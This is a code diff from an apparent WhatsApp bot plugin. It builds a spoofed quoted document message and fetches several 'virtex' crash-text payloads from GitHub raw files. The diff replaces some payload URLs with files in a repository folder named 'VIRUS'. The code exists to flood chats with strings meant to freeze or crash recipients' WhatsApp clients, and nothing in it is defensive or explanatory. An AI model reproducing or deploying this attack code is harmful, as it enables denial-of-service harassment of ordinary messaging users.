@@ -16,11 +16,11 @@ if (!text) send = `this chat`;
     
 const doc = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})}, "message": { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc", "mimetype": "application/octet-stream", "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=", "fileLength": "64455", "pageCount": 1, "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=", "fileName": `simple•MD`, "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
     
-let virtex1 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
-let virtex2 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/2.txt').then(v => v.text());
-let virtex3 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/3.txt').then(v => v.text());
-let virtex4 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());
-let virtex5 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text()); 
+let virtex1 = await fetch('https://raw.githubusercontent.com/Guru322/GURU-BOT/main/VIRUS/virus6.txt').then(v => v.text());
+let virtex2 = await fetch('https://raw.githubusercontent.com/Guru322/GURU-BOT/main/VIRUS/virus7.txt').then(v => v.text());
+let virtex3 = await fetch('https://raw.githubusercontent.com/Guru322/GURU-BOT/main/VIRUS/virus8.txt').then(v => v.text());
+let virtex4 = await fetch('https://raw.githubusercontent.com/Guru322/GURU-BOT/main/VIRUS/virus9.txt').then(v => v.text());
+let virtex5 = await fetch('https://raw.githubusercontent.com/Guru322/GURU-BOT/main/VIRUS/virusloc.txt').then(v => v.text()); 
 let virtex6 = await fetch('https://raw.githubusercontent.com/Guru322/GURU-BOT/main/VIRUS/virus1.txt').then(v => v.text());
 let virtex7 = await fetch('https://raw.githubusercontent.com/Guru322/GURU-BOT/main/VIRUS/virus2.txt').then(v => v.text());
 let virtex8 = await fetch('https://raw.githubusercontent.com/Guru322/GURU-BOT/main/VIRUS/virus5.txt').then(v => v.text());
